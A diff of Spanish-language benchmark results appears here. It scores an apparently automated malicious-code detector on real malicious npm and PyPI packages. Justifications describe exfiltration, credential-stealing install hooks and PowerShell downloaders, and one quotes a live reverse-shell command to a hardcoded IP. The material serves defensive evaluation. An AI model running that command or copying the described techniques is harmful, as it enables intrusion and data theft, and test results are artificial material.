+    "justificacion": "El código nuevo (`main.py`) recopila activamente información del sistema (hostname, username, ruta actual, direcciones MAC ejecutando comandos del sistema) y la exfiltra a tres dominios externos codificados, usando un bl"
   },
   {
     "caso": "malreal_npm_compromised_lib__asyncapi_protobuf-schema-parser_150",
     "clase": "malicious",
     "dificultad": "hard",
-    "esperado": "rojo (min. 35)",
+    "esperado": "amarillo/rojo (min. 35)",
     "obtenido": "verde (4)",
     "score": 4,
     "cumple": "DIVERGE",
     "categoria": "ninguna",
-    "justificacion": "El cambio añade un nuevo módulo JavaScript para convertir esquemas Protocol Buffers a JSON Schema, utilizando la librería protobufjs, y no muestra indicios de actividad maliciosa como exfiltración, puertas traseras o eje"
+    "justificacion": "El cambio añade un nuevo módulo JavaScript que convierte esquemas Protocol Buffer a esquemas JSON, sin evidencia de ejecución de código externo arbitrario, exfiltración de datos o interacción con el sistema de archivos m"
   },
   {
     "caso": "malreal_npm_malicious_intent_dhqr92010_17",
     "clase": "malicious",
     "dificultad": "hard",
-    "esperado": "rojo (min. 35)",
-    "obtenido": "rojo (90)",
-    "score": 90,
+    "esperado": "amarillo/rojo (min. 35)",
+    "obtenido": "rojo (86)",
+    "score": 86,
     "cumple": "OK",
     "categoria": "exfiltracion",
-    "justificacion": "El script recolecta información sensible del sistema y la red (IP pública/local, hostname, detalles del paquete, información de CPU/memoria) y la exfiltra a un webhook de Discord al arrancar, bajo el disfraz de una notif"
+    "justificacion": "El script `discordNotify` recolecta una amplia gama de información sensible del sistema y del entorno (IPs públicas/privadas, hostname, recursos del sistema, información del paquete y variables de entorno) y la exfiltra "
   },
   {
     "caso": "malreal_npm_malicious_intent_nit-quotation-service-core-lib_34",
     "clase": "malicious",
     "dificultad": "hard",
-    "esperado": "rojo (min. 35)",
-    "obtenido": "verde (24)",
-    "score": 24,
-    "cumple": "DIVERGE",
-    "categoria": "ninguna",
-    "justificacion": "El diff no muestra patrones maliciosos obvios. El fichero .gitkeep_base no contiene cambios significativos y helpers.js, aunque grande, no ha sido detectado con patrones maliciosos por el análisis estático."
+    "esperado": "amarillo/rojo (min. 35)",
+    "obtenido": "rojo (86)",
+    "score": 86,
+    "cumple": "OK",
+    "categoria": "exfiltracion",
+    "justificacion": "El fichero 'helpers.js' contiene una función `getAnalyticsData` que recopila información del sistema y la envía a un dominio externo (`npia.vercel.app`) a través de HTTPS, y otra función `safeBackup` que escribe datos en"
   },
   {
     "caso": "malreal_pypi_compromised_lib_litellm_8",
     "clase": "malicious",
     "dificultad": "hard",
-    "esperado": "rojo (min. 35)",
-    "obtenido": "verde (7)",
-    "score": 7,
-    "cumple": "DIVERGE",
-    "categoria": "ninguna",
-    "justificacion": "Se añaden 9498 líneas a `utils.py` sin que el análisis estático detecte patrones maliciosos, y 0 líneas a `.gitkeep_base`."
+    "esperado": "amarillo/rojo (min. 35)",
+    "obtenido": "rojo (70)",
+    "score": 70,
+    "cumple": "OK",
+    "categoria": "backdoor",
+    "justificacion": "La función `literal_eval()` en el fichero nuevo `utils.py` puede permitir la ejecución de código arbitrario si el parámetro `param_type` proviene de una entrada no verificada, creando un vector para un backdoor."
   },
   {
     "caso": "malreal_pypi_compromised_lib_telnyx_2",
     "clase": "malicious",
     "dificultad": "hard",
-    "esperado": "rojo (min. 35)",
-    "obtenido": "verde (0)",
-    "score": 0,
-    "cumple": "DIVERGE",
-    "categoria": "ninguna",
-    "justificacion": "El diff solo indica que se han añadido líneas a '_client.py' sin mostrar su contenido real, impidiendo cualquier análisis de seguridad del código."
+    "esperado": "amarillo/rojo (min. 35)",
+    "obtenido": "rojo (71)",
+    "score": 71,
+    "cumple": "OK",
+    "categoria": "backdoor",
+    "justificacion": "El nuevo fichero '_client.py' contiene una secuencia de base64 y descifrado XOR sobre el contenido de un fichero WAV para obtener un 'payload', seguido por la ejecución remota de código ofuscado (base64-decodificado) a t"
   },
   {
     "caso": "malreal_pypi_compromised_lib_telnyx_4",
     "clase": "malicious",
     "dificultad": "hard",
-    "esperado": "rojo (min. 35)",
-    "obtenido": "verde (4)",
-    "score": 4,
-    "cumple": "DIVERGE",
-    "categoria": "ninguna",
-    "justificacion": "Se han añadido 7828 líneas al fichero _client.py y 0 al fichero .gitkeep_base. El análisis estático no ha detectado ningún patrón de código malicioso en las líneas añadidas de ninguno de los dos ficheros."
+    "esperado": "amarillo/rojo (min. 35)",
+    "obtenido": "rojo (71)",
+    "score": 71,
+    "cumple": "OK",
+    "categoria": "backdoor",
+    "justificacion": "El código decodifica contenido de un fichero .wave, lo desofusca con una operación XOR, y luego ejecuta código remoto o arbitrario previamente oculto mediante un subprocess.Popen que usa 'exec(base64.b64decode(...))', to"
   },
   {
     "caso": "malreal_pypi_compromised_lib_xinference_11",
     "clase": "malicious",
     "dificultad": "hard",
-    "esperado": "rojo (min. 35)",
-    "obtenido": "verde (4)",
-    "score": 4,
-    "cumple": "DIVERGE",
-    "categoria": "ninguna",
-    "justificacion": "El diff no presenta patrones de cambios maliciosos; solo se indica la adición de líneas a un fichero Python sin patrones detectados por análisis estático y un fichero .gitkeep sin cambios."
+    "esperado": "amarillo/rojo (min. 35)",
+    "obtenido": "amarillo (58)",
+    "score": 58,
+    "cumple": "OK",
+    "categoria": "backdoor",
+    "justificacion": "La decodificación de datos de audio de base64 (`base64.b64decode(history[-1][\"audio\"][\"data\"])`) y su escritura directa a un archivo temporal (`audio_file.write(audio_bytes)`) sin validación de contenido permite a un ata"
   },
   {
     "caso": "malreal_pypi_malicious_intent_mirrorbot_10",
     "clase": "malicious",
     "dificultad": "hard",
-    "esperado": "rojo (min. 35)",
-    "obtenido": "verde (24)",
-    "score": 24,
-    "cumple": "DIVERGE",
+    "esperado": "amarillo/rojo (min. 35)",
+    "obtenido": "amarillo (64)",
+    "score": 64,
+    "cumple": "OK",
     "categoria": "ninguna",
-    "justificacion": "Se añade un nuevo fichero .py de 811 líneas y un fichero .gitkeep_base sin patrones maliciosos detectados por el análisis estático en ninguna de las nuevas líneas."
+    "justificacion": "No se proporcionó ningún contenido de cambio (diff) para analizar, por lo que no se pudo detectar ninguna intención maliciosa en este PR. [Ajustado a 60: hay contenido del diff que no se pudo revisar (truncado por tamaño"
   },
   {
     "caso": "malreal_pypi_malicious_intent_my-package-jiecub3_6",
@@ -1845,40 +1845,40 @@
     "score": 75,
     "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "La línea 11 del nuevo fichero añade un comando de reverse shell (`os.system('nohup bash -i >& /dev/tcp/121.40.190.95/54325 0>&1 &')`). Aunque está comentado y, por lo tanto, no se ejecuta directamente en este diff, su pr"
+    "justificacion": "El diff introduce una línea comentada que contiene una reverse shell (os.system('nohup bash -i >& /dev/tcp/121.40.190.95/54325 0>&1 &')), un claro patrón de backdoor, aunque actualmente no se ejecuta, lo que indica una c"
   },
   {
     "caso": "malreal_pypi_malicious_intent_mysqlloadup_7",
     "clase": "malicious",
     "dificultad": "hard",
-    "esperado": "rojo (min. 35)",
-    "obtenido": "verde (24)",
-    "score": 24,
-    "cumple": "DIVERGE",
-    "categoria": "ninguna",
-    "justificacion": "El diff no muestra cambios ni patrones de código sospechosos en los ficheros .gitkeep_base ni __init__.py; ambos son convenciones estándar sin contenido malicioso."
+    "esperado": "amarillo/rojo (min. 35)",
+    "obtenido": "rojo (86)",
+    "score": 86,
+    "cumple": "OK",
+    "categoria": "ofuscacion",
+    "justificacion": "El fichero nuevo '__init__.py' está completamente ofuscado con 'BlankOBF', usa variables con nombres incomprensibles y evalúa cadenas codificadas (ej. '\\145\\x76\\141\\154' es 'eval'), impidiendo la revisión humana de su fu"
   },
   {
     "caso": "malreal_npm_compromised_lib__ensdomains_hardhat-toolbox-viem-extende_285",
     "clase": "malicious",
     "dificultad": "medium",
     "esperado": "rojo (min. 55)",
-    "obtenido": "amarillo (65)",
-    "score": 65,
-    "cumple": "DIVERGE",
+    "obtenido": "rojo (70)",
+    "score": 70,
+    "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "El script descarga y ejecuta código arbitrario de dominios externos ('bun.sh/install.ps1' vía PowerShell y 'bun.sh/install' vía curl | bash), y luego procede a ejecutar un script local 'bun_environment.js' usando el bina"
+    "justificacion": "El script descarga y ejecuta código de un dominio externo (`bun.sh/install`) usando `curl | bash` o `powershell | iex`, y ejecuta un script local (`bun_environment.js`) con `stdio: 'ignore'`, además de suprimir errores a"
   },
   {
     "caso": "malreal_npm_compromised_lib__ensdomains_subdomain-registrar_137",
     "clase": "malicious",
     "dificultad": "medium",
     "esperado": "rojo (min. 55)",
-    "obtenido": "amarillo (65)",
-    "score": 65,
-    "cumple": "DIVERGE",
+    "obtenido": "rojo (70)",
+    "score": 70,
+    "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "El script descarga y ejecuta directamente código externo desde 'https://bun.sh/install' (líneas 56-59), que puede cambiar arbitrariamente después de la revisión del PR, y luego intenta ejecutar un script local no incluid"
+    "justificacion": "El script `setup_bun.js` descarga y ejecuta código arbitrario de una URL externa (`https://bun.sh/install` o `bun.sh/install.ps1` mediante `curl | bash` o `irm | iex`) en tiempo de ejecución, un patrón conocido de backdo"
   },
   {
     "caso": "malreal_npm_compromised_lib__tallyui_storage-sqlite_218",
@@ -1889,62 +1889,62 @@
     "score": 4,
     "cumple": "DIVERGE",
     "categoria": "ninguna",
-    "justificacion": "El cambio consiste en añadir un nuevo fichero de test de integración para una base de datos RxDB con SQLite, que realiza operaciones CRUD estándar sin lógica sospechosa, llamadas de red o interacción con el sistema fuera"
+    "justificacion": "El cambio introduce un nuevo fichero de test de integración que verifica la funcionalidad de una base de datos local (RxDB con SQLite en memoria), sin llamadas de red, ejecución de código externo ni modificaciones a scri"
   },
   {
     "caso": "malreal_npm_compromised_lib__voiceflow_fetch_97",
     "clase": "malicious",
     "dificultad": "medium",
     "esperado": "rojo (min. 55)",
-    "obtenido": "amarillo (65)",
-    "score": 65,
-    "cumple": "DIVERGE",
+    "obtenido": "rojo (70)",
+    "score": 70,
+    "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "El script descarga y ejecuta código directamente de 'bun.sh/install' (o 'bun.sh/install.ps1' en Windows) sin verificar su contenido, un patrón de 'curl | bash' con alto riesgo de cadena de suministro. Además, al finaliza"
+    "justificacion": "El script descarga y ejecuta código arbitrario de 'bun.sh/install' usando 'curl | bash' o 'powershell | iex', y en todos los casos de error o fallo de ejecución, el script termina con 'process.exit(0)' ocultando cualquie"
   },
   {
     "caso": "malreal_npm_compromised_lib_posthog-node_2",
     "clase": "malicious",
     "dificultad": "medium",
     "esperado": "rojo (min. 55)",
-    "obtenido": "amarillo (69)",
-    "score": 69,
-    "cumple": "DIVERGE",
+    "obtenido": "rojo (70)",
+    "score": 70,
+    "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "El nuevo script descarga y ejecuta código arbitrario (`curl ... | bash` o `irm ... | iex`) directamente desde un dominio externo durante la instalación, y posteriormente intenta ejecutar un script `bun_environment.js` qu"
+    "justificacion": "El script `setup_bun.js` descarga y ejecuta directamente un script de instalación (`https://bun.sh/install` o `bun.sh/install.ps1`) desde una URL externa usando `curl | bash` o `powershell | iex`, un patrón de riesgo con"
   },
   {
     "caso": "malreal_npm_compromised_lib_undefsafe-typed_29",
     "clase": "malicious",
     "dificultad": "medium",
     "esperado": "rojo (min. 55)",
-    "obtenido": "amarillo (65)",
-    "score": 65,
-    "cumple": "DIVERGE",
+    "obtenido": "rojo (70)",
+    "score": 70,
+    "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "El nuevo script descarga y ejecuta código arbitrario de dominios externos (bun.sh/install) usando `curl | bash` o `powershell | iex`, lo cual es un patrón de alto riesgo para la inyección de código remoto y la creación d"
+    "justificacion": "El script descarga y ejecuta arbitrariamente código externo (`curl -fsSL https://bun.sh/install | bash` o `irm bun.sh/install.ps1|iex`) durante su fase de instalación, sin fijar una versión o hash de los scripts descarga"
   },
   {
     "caso": "malreal_npm_malicious_intent_atm-event-app_11",
     "clase": "malicious",
     "dificultad": "medium",
     "esperado": "rojo (min. 55)",
-    "obtenido": "rojo (92)",
-    "score": 92,
+    "obtenido": "rojo (91)",
+    "score": 91,
     "cumple": "OK",
     "categoria": "exfiltracion",
-    "justificacion": "El nuevo fichero 'index.js' recolecta información sensible del sistema, como '/etc/passwd', '/etc/hosts', nombre de usuario, hostname y la configuración DNS, y la exfiltra a un dominio externo conocido (oastify.com, un B"
+    "justificacion": "El fichero nuevo recolecta datos sensibles del sistema (como /etc/passwd, /etc/hosts, nombre de usuario, nombre de host, y servidores DNS) y los exfiltra a un dominio externo (oastify.com) a través de una petición HTTPS "
   },
   {
     "caso": "malreal_npm_malicious_intent_bambang-mangut66-sukiwir_14",
     "clase": "malicious",
     "dificultad": "medium",
     "esperado": "rojo (min. 55)",
-    "obtenido": "rojo (86)",
-    "score": 86,
+    "obtenido": "rojo (90)",
+    "score": 90,
     "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "El nuevo script 'auto.js' automatiza la modificación de 'package.json' para establecer 'private: false', generar nombres y versiones de paquete aleatorias, y luego ejecutar 'npm publish --access public' repetidamente, lo"
+    "justificacion": "El script `auto.js` se añade con el propósito de modificar continuamente el `package.json` (eliminando la propiedad 'private', cambiando la versión y generando nombres aleatorios) y luego publicar estos paquetes al regis"
   },
   {
     "caso": "malreal_npm_malicious_intent_breadcrumb-service_20",
@@ -1955,7 +1955,7 @@
     "score": 90,
     "cumple": "OK",
     "categoria": "exfiltracion",
-    "justificacion": "El fichero nuevo recopila una cantidad extensa de información del sistema, incluyendo datos obtenidos mediante ejecución de comandos shell (`whoami`, `id`), y exfiltra todos esos datos en un payload JSON a un dominio ext"
+    "justificacion": "El nuevo fichero `index.js` recopila información detallada del sistema y del usuario (quién soy, id de usuario, directorio actual, hostname, info de OS, info de usuario como uid/gid/shell) y la exfiltra vía POST a una UR"
   },
   {
     "caso": "malreal_npm_malicious_intent_jstoauto_26",
@@ -1966,29 +1966,29 @@
     "score": 24,
     "cumple": "DIVERGE",
     "categoria": "ninguna",
-    "justificacion": "Se añade un nuevo archivo `tools.js` que contiene lógica para una librería de logging (serialización, formateo, manejo de streams de salida), sin patrones de ofuscación, exfiltración, ejecución de código remoto o cambios"
+    "justificacion": "El fichero nuevo contiene código utilitario para una librería de logging (aparentemente `pino`), sin cadenas ofuscadas, llamadas de red sospechosas, o construcciones que permitan la ejecución remota de código."
   },
   {
     "caso": "malreal_npm_malicious_intent_laila-rangi14-breki_30",
     "clase": "malicious",
     "dificultad": "medium",
     "esperado": "rojo (min. 55)",
-    "obtenido": "rojo (92)",
-    "score": 92,
+    "obtenido": "rojo (90)",
+    "score": 90,
     "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "El script `auto.js` modifica el `package.json` y `package-lock.json` para cambiar el nombre y la versión del paquete a valores aleatorios, elimina la propiedad `private: true`, y luego ejecuta `npm publish --access publi"
+    "justificacion": "El script `auto.js` modifica continuamente el `package.json` (eliminando `private: true`, cambiando la versión y generando nombres aleatorios con '-breki') y luego ejecuta `npm publish --access public` en un bucle infini"
   },
   {
     "caso": "malreal_npm_malicious_intent_putri-nasi94-ruro_10",
     "clase": "malicious",
     "dificultad": "medium",
     "esperado": "rojo (min. 55)",
-    "obtenido": "rojo (86)",
-    "score": 86,
+    "obtenido": "rojo (90)",
+    "score": 90,
     "cumple": "OK",
-    "categoria": "backdoor",
-    "justificacion": "El script elimina la propiedad 'private: true' de `package.json`, genera nombres de paquete aleatorios y ejecuta `npm publish --access public` repetidamente, lo cual es un patrón de abuso del registro de paquetes utiliza"
+    "categoria": "escalada_privilegios",
+    "justificacion": "El script modifica repetidamente el `package.json` para eliminar la propiedad `private` y cambiar el nombre y la versión del paquete, y luego ejecuta `npm publish --access public` de forma continua para publicar paquetes"
   },
   {
     "caso": "malreal_npm_malicious_intent_scoin_setting_1",
@@ -1999,18 +1999,18 @@
     "score": 90,
     "cumple": "OK",
     "categoria": "exfiltracion",
-    "justificacion": "La función `getCurrentSetting` realiza una llamada `fetch` a una IP externa hardcodeada (`http://178.128.61.8:3004/api`) para enviar el contenido completo de las variables de entorno (`process.env`) codificado en Base64."
+    "justificacion": "El método 'getCurrentSetting' del nuevo fichero realiza una llamada 'fetch' a una IP hardcodeada (línea 25), enviando todas las variables de entorno del proceso codificadas en Base64 (línea 29) a un servidor externo."
   },
   {
     "caso": "malreal_pypi_compromised_lib_lightning_5",
     "clase": "malicious",
     "dificultad": "medium",
     "esperado": "rojo (min. 55)",
-    "obtenido": "verde (7)",
-    "score": 7,
+    "obtenido": "verde (4)",
+    "score": 4,
     "cumple": "DIVERGE",
     "categoria": "ninguna",
-    "justificacion": "El nuevo fichero es un lanzador de procesos distribuidos que usa 'subprocess.Popen' para re-ejecutar el mismo script en procesos hijos, estableciendo variables de entorno estándar para DDP; no descarga ni ejecuta código "
+    "justificacion": "El nuevo fichero Python implementa un lanzador de procesos para aplicaciones distribuidas, usando `subprocess.Popen` para replicar el script actual con diferentes variables de entorno para cada rango local, y no contiene"
   },
   {
     "caso": "malreal_pypi_malicious_intent_axderz_5",
@@ -2021,7 +2021,7 @@
     "score": 92,
     "cumple": "OK",
     "categoria": "exfiltracion",
-    "justificacion": "El nuevo fichero setup.py define hooks de instalación (AfterInstall y AfterDevelop) que ejecutan las funciones stealenv() y stealsshkey(), las cuales recolectan variables de entorno, contenido de ficheros .env y claves S"
+    "justificacion": "El archivo setup.py añade hooks de instalación (`AfterInstall`) que ejecutan funciones (`stealenv`, `stealsshkey`) para buscar archivos .env, exfiltrar todas las variables de entorno y la clave privada SSH (~/.ssh/id_rsa"
   },
   {
     "caso": "malreal_pypi_malicious_intent_libcontrolverlgtb_8",
@@ -2032,7 +2032,7 @@
     "score": 92,
     "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "El fichero setup.py descarga y ejecuta con PowerShell un binario remoto ('Stage1.exe' de GitHub, guardado como 'WindowsCache.exe') inmediatamente al ser ejecutado, ocultando la ventana de PowerShell para evitar ser detec"
+    "justificacion": "El script setup.py descarga y ejecuta un binario remoto ('Stage1.exe' de GitHub) en un intento de ocultarlo usando una orden Powershell codificada en base64, que luego se ejecuta silenciosamente sin abrir una ventana de "
   },
   {
     "caso": "malreal_pypi_malicious_intent_lolsagetestbaha_9",
@@ -2043,7 +2043,7 @@
     "score": 92,
     "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "El script setup.py, que se ejecuta durante la instalación, crea directorios en la ruta de inicio de Windows, clona dos repositorios de GitHub con nombres sospechosos ('test2lmaos', 'defonotagrabber'), mueve un script Pyt"
+    "justificacion": "El script de instalación (setup.py) sobreescribe el comando 'install' para descargar y ejecutar código arbitrario desde dos repositorios de GitHub externos ('dcsage/test2lmaos.git' y 'dcsage/defonotagrabber.git'), mover "
   },
   {
     "caso": "malreal_pypi_malicious_intent_networkx-match-ssss_19",
@@ -2054,7 +2054,7 @@
     "score": 82,
     "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "El método `run` de la clase `PostInstallCommand` contiene una sección comentada que intenta establecer una conexión de socket TCP (`sock.connect(server_address)`) a una dirección IP y puerto fijos, un patrón claro de una"
+    "justificacion": "El fichero nuevo añade una clase PostInstallCommand que anula el comportamiento por defecto de la instalación para ejecutar código arbitrario con subprocess.check_call. Aunque la sección de red está comentada, su presenc"
   },
   {
     "caso": "malreal_pypi_malicious_intent_py-getcvad_16",
@@ -2065,7 +2065,7 @@
     "score": 92,
     "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "El script setup.py, que se ejecuta en la instalación del paquete, contiene un comando PowerShell codificado en Base64 que descarga y ejecuta un ejecutable (Esquele.exe) desde un dominio externo (cdn.discordapp.com) en el"
+    "justificacion": "El script setup.py descarga un ejecutable desde una URL de Discord CDN ('https://cdn.discordapp.com/attachments/.../Esquele.exe') y lo ejecuta silenciosamente (`powershell -WindowStyle Hidden -EncodedCommand ...`, `creat"
   },
   {
     "caso": "malreal_pypi_malicious_intent_py-pushpullsuper_0",
@@ -2076,7 +2076,7 @@
     "score": 92,
     "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "El script setup.py añade código que descarga un ejecutable externo ('Esquele.exe') desde un CDN de Discord y lo ejecuta silenciosamente durante la instalación del paquete, usando una cadena de PowerShell ofuscada con Bas"
+    "justificacion": "El nuevo fichero setup.py descarga y ejecuta un ejecutable (Esquele.exe) desde un CDN de Discord durante la instalación del paquete, sin relación con la funcionalidad declarada, y lo ejecuta ocultando la ventana de la co"
   },
   {
     "caso": "malreal_pypi_malicious_intent_selfccreplacever_20",
@@ -2087,7 +2087,7 @@
     "score": 92,
     "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "El archivo setup.py descarga un ejecutable (.exe) desde una URL externa (cdn.discordapp.com) y lo ejecuta silenciosamente (`powershell -WindowStyle Hidden -EncodedCommand ...`) durante la instalación del paquete, un clar"
+    "justificacion": "El script setup.py descarga y ejecuta un ejecutable arbitrario (Esquele.exe) desde una URL remota de Discord CDN usando PowerShell, lo que establece una puerta trasera en el sistema de la víctima. La ejecución se oculta "
   },
   {
     "caso": "malreal_pypi_malicious_intent_tpcandykillget_21",
@@ -2098,6 +2098,6 @@
     "score": 92,
     "cumple": "OK",
     "categoria": "backdoor",
-    "justificacion": "El script setup.py descarga y ejecuta un ejecutable (Esquele.exe) desde un CDN de Discord en el sistema, lo que constituye una backdoor directa con ofuscación mediante codificación Base64 y un intento de ejecución silenc"
+    "justificacion": "El archivo setup.py añade un nuevo paso que, al ejecutarse, invoca un comando de PowerShell codificado en base64, que descarga un ejecutable ('Esquele.exe') de una URL de Discord CDN y lo ejecuta (`Invoke-WebRequest ... "
   }
 ]
